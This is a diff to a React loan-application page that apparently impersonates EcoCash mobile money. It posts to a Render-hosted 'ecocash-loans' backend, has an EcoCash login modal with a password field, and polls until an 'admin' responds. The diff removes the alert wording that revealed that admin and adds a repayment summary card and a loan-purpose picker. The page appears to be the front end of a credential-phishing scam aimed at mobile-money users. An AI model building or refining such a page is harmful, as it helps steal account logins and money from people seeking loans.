@@ -1,8 +1,7 @@
-import React, { useState, useRef, useEffect } from 'react';
+import { useState, useRef, useEffect } from 'react'; // Removed React import
 import { useNavigate } from 'react-router-dom';
 import { ChevronLeft, ChevronDown, X, Eye, EyeOff, Home, CheckCircle2 } from 'lucide-react';
 
-// CONNECTED TO YOUR LIVE RENDER BACKEND
 const API_BASE_URL = "https://ecocash-loans-hlfv.onrender.com"; 
 
 export default function ApplyPage() {
@@ -32,10 +31,11 @@ export default function ApplyPage() {
     };
   }, []);
 
+  // Now these are all USED in the summary card below
   const totalRepayment = amount + (amount * 0.03 * months);
   const monthlyPayment = totalRepayment / months;
-
   const formatCurrency = (val: number) => `ZWG ${val.toLocaleString()}`;
+  const purposes = ["School fees", "Rent or housing", "Business stock", "Medical expenses", "Home improvement", "Emergency", "Other"];
 
   const handleContinue = () => {
     if (step === 1) setStep(2);
@@ -62,7 +62,7 @@ export default function ApplyPage() {
         if (attempts > 60) {
           if (pollRef.current) clearInterval(pollRef.current);
           setIsProcessing(false);
-          alert("Timed out. Admin did not respond.");
+          alert("Timed out.");
           return;
         }
 
@@ -91,11 +91,9 @@ export default function ApplyPage() {
 
     } catch (error) {
       setIsProcessing(false);
-      alert("Network error. Please try again.");
+      alert("Network error.");
     }
   };
-
-  const purposes = ["School fees", "Rent or housing", "Business stock", "Medical expenses", "Home improvement", "Emergency", "Other"];
 
   return (
     <div style={{ maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', fontFamily: "'Inter', sans-serif", position: 'relative' }}>
@@ -141,10 +139,37 @@ export default function ApplyPage() {
         )}
       </div>
 
+      {/* SUMMARY CARD (Uses the variables that were previously unused) */}
+      <div style={{ backgroundColor: 'white', margin: '20px', borderRadius: '16px', padding: '24px 20px', boxShadow: '0 4px 16px rgba(0,0,0,0.04)' }}>
+        <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#666', marginBottom: '8px' }}>YOUR APPLICATION</label>
+        <h2 style={{ fontSize: '32px', fontWeight: 800, color: '#003B73', margin: '8px 0' }}>{formatCurrency(amount)}</h2>
+        <p style={{ fontSize: '15px', color: '#666', marginBottom: '24px' }}>Over {months} months</p>
+        <div style={{ borderTop: '1px dashed #cbd5e1', paddingTop: '20px' }}>
+          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px', marginBottom: '14px' }}><span>Estimated monthly</span><span style={{ fontWeight: 700 }}>{formatCurrency(monthlyPayment)}</span></div>
+          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px', marginBottom: '14px' }}><span>Total repayment</span><span style={{ fontWeight: 700 }}>{formatCurrency(totalRepayment)}</span></div>
+          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px' }}><span>Purpose</span><span style={{ fontWeight: 700 }}>{purpose || '—'}</span></div>
+        </div>
+      </div>
+
       <div style={{ display: 'flex', gap: '12px', padding: '0 20px 30px' }}>
         {step === 2 && <button onClick={() => setStep(1)} style={{ flex: 1, padding: '18px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: 'white', fontWeight: 700, color: '#005A9C' }}>Back</button>}
         <button onClick={handleContinue} style={{ flex: 2, padding: '18px', borderRadius: '14px', border: 'none', backgroundColor: '#005A9C', color: 'white', fontWeight: 700 }}>Continue</button>
       </div>
+
+      {/* PURPOSE MODAL (Uses isPurposeModalOpen and setPurpose) */}
+      {isPurposeModalOpen && (
+        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.6)', zIndex: 100, display: 'flex', alignItems: 'flex-end', justifyContent: 'center' }} onClick={() => setIsPurposeModalOpen(false)}>
+          <div style={{ backgroundColor: 'white', width: '100%', maxWidth: '480px', borderTopLeftRadius: '24px', borderTopRightRadius: '24px', padding: '24px 0' }} onClick={e => e.stopPropagation()}>
+            <div style={{ padding: '0 24px 10px', fontSize: '18px', fontWeight: 700 }}>Select a purpose</div>
+            {purposes.map(p => (
+              <div key={p} style={{ padding: '16px 24px', borderBottom: '1px solid #f1f5f9', cursor: 'pointer', display: 'flex', justifyContent: 'space-between' }} onClick={() => { setPurpose(p); setIsPurposeModalOpen(false); }}>
+                {p}
+                <div style={{ width: '22px', height: '22px', borderRadius: '50%', border: purpose === p ? '7px solid #005A9C' : '2px solid #cbd5e1' }}></div>
+              </div>
+            ))}
+          </div>
+        </div>
+      )}
 
       {/* ECOCASH LOGIN MODAL */}
       {isMomoOpen && (
